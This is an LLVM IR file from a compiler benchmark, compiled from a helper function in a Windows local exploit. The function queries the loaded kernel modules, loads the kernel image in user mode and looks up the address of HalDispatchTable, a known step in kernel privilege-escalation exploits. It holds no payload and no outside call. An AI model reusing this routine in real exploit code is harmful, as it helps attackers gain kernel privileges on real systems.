; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_17902.c_LoadAndGetKernelBase.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_17902.c_LoadAndGetKernelBase.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { %struct.TYPE_4__* }
%struct.TYPE_4__ = type { i32*, i32 }

@.str = private unnamed_addr constant [6 x i8] c"ntdll\00", align 1
@FALSE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"NtQuerySystemInformation\00", align 1
@SystemModuleInformation = common dso_local global i32 0, align 4
@GMEM_ZEROINIT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"HalDispatchTable\00", align 1
@HalDispatchTable = common dso_local global i64 0, align 8
@TRUE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @LoadAndGetKernelBase() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [256 x i32], align 16
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32*, align 8
  %6 = alloca i64 (i32, %struct.TYPE_5__*, i32, i32*)*, align 8
  %7 = alloca %struct.TYPE_5__*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32*, align 8
  store i32* null, i32** %3, align 8
  %11 = call i32* @GetModuleHandle(i32 ptrtoint ([6 x i8]* @.str to i32))
  store i32* %11, i32** %10, align 8
  %12 = load i32*, i32** %10, align 8
  %13 = icmp ne i32* %12, null
  br i1 %13, label %16, label %14

14:                                               ; preds = %0
  %15 = load i32, i32* @FALSE, align 4
  store i32 %15, i32* %1, align 4
  br label %77

16:                                               ; preds = %0
  %17 = load i32*, i32** %10, align 8
  %18 = call i64 @GetProcAddress(i32* %17, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %19 = inttoptr i64 %18 to i64 (i32, %struct.TYPE_5__*, i32, i32*)*
  store i64 (i32, %struct.TYPE_5__*, i32, i32*)* %19, i64 (i32, %struct.TYPE_5__*, i32, i32*)** %6, align 8
  %20 = load i64 (i32, %struct.TYPE_5__*, i32, i32*)*, i64 (i32, %struct.TYPE_5__*, i32, i32*)** %6, align 8
  %21 = icmp ne i64 (i32, %struct.TYPE_5__*, i32, i32*)* %20, null
  br i1 %21, label %24, label %22

22:                                               ; preds = %16
  %23 = load i32, i32* @FALSE, align 4
  store i32 %23, i32* %1, align 4
  br label %77

24:                                               ; preds = %16
  %25 = load i64 (i32, %struct.TYPE_5__*, i32, i32*)*, i64 (i32, %struct.TYPE_5__*, i32, i32*)** %6, align 8
  %26 = load i32, i32* @SystemModuleInformation, align 4
  %27 = call i64 %25(i32 %26, %struct.TYPE_5__* null, i32 0, i32* %8)
  store i64 %27, i64* %9, align 8
  %28 = load i64, i64* %9, align 8
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %32, label %30

30:                                               ; preds = %24
  %31 = load i32, i32* @FALSE, align 4
  store i32 %31, i32* %1, align 4
  br label %77

32:                                               ; preds = %24
  %33 = load i32, i32* @GMEM_ZEROINIT, align 4
  %34 = load i32, i32* %8, align 4
  %35 = call i64 @GlobalAlloc(i32 %33, i32 %34)
  %36 = inttoptr i64 %35 to %struct.TYPE_5__*
  store %struct.TYPE_5__* %36, %struct.TYPE_5__** %7, align 8
  %37 = load i64 (i32, %struct.TYPE_5__*, i32, i32*)*, i64 (i32, %struct.TYPE_5__*, i32, i32*)** %6, align 8
  %38 = load i32, i32* @SystemModuleInformation, align 4
  %39 = load %struct.TYPE_5__*, %struct.TYPE_5__** %7, align 8
  %40 = load i32, i32* %8, align 4
  %41 = call i64 %37(i32 %38, %struct.TYPE_5__* %39, i32 %40, i32* %8)
  store i64 %41, i64* %9, align 8
  %42 = getelementptr inbounds [256 x i32], [256 x i32]* %2, i64 0, i64 0
  %43 = call i32 @memset(i32* %42, i32 0, i32 1024)
  %44 = getelementptr inbounds [256 x i32], [256 x i32]* %2, i64 0, i64 0
  %45 = load %struct.TYPE_5__*, %struct.TYPE_5__** %7, align 8
  %46 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %45, i32 0, i32 0
  %47 = load %struct.TYPE_4__*, %struct.TYPE_4__** %46, align 8
  %48 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %47, i64 0
  %49 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %48, i32 0, i32 1
  %50 = load i32, i32* %49, align 8
  %51 = call i32 @strcpy_s(i32* %44, i32 1023, i32 %50)
  %52 = load %struct.TYPE_5__*, %struct.TYPE_5__** %7, align 8
  %53 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %52, i32 0, i32 0
  %54 = load %struct.TYPE_4__*, %struct.TYPE_4__** %53, align 8
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %54, i64 0
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 0
  %57 = load i32*, i32** %56, align 8
  store i32* %57, i32** %3, align 8
  %58 = getelementptr inbounds [256 x i32], [256 x i32]* %2, i64 0, i64 0
  %59 = call i32 @strrchr(i32* %58, i8 signext 92)
  store i32 %59, i32* %4, align 4
  %60 = load i32, i32* %4, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %4, align 4
  %62 = call i32* @LoadLibraryA(i32 %61)
  store i32* %62, i32** %5, align 8
  %63 = load i32*, i32** %5, align 8
  %64 = icmp eq i32* %63, null
  br i1 %64, label %65, label %67

65:                                               ; preds = %32
  %66 = load i32, i32* @FALSE, align 4
  store i32 %66, i32* %1, align 4
  br label %77

67:                                               ; preds = %32
  %68 = load i32*, i32** %5, align 8
  %69 = load i32*, i32** %3, align 8
  %70 = call i64 @GetKernAddress(i32* %68, i32* %69, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  store i64 %70, i64* @HalDispatchTable, align 8
  %71 = load i64, i64* @HalDispatchTable, align 8
  %72 = icmp ne i64 %71, 0
  br i1 %72, label %75, label %73

73:                                               ; preds = %67
  %74 = load i32, i32* @FALSE, align 4
  store i32 %74, i32* %1, align 4
  br label %77

75:                                               ; preds = %67
  %76 = load i32, i32* @TRUE, align 4
  store i32 %76, i32* %1, align 4
  br label %77

77:                                               ; preds = %75, %73, %65, %30, %22, %14
  %78 = load i32, i32* %1, align 4
  ret i32 %78
}

declare dso_local i32* @GetModuleHandle(i32) #1

declare dso_local i64 @GetProcAddress(i32*, i8*) #1

declare dso_local i64 @GlobalAlloc(i32, i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @strcpy_s(i32*, i32, i32) #1

declare dso_local i32 @strrchr(i32*, i8 signext) #1

declare dso_local i32* @LoadLibraryA(i32) #1

declare dso_local i64 @GetKernAddress(i32*, i32*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
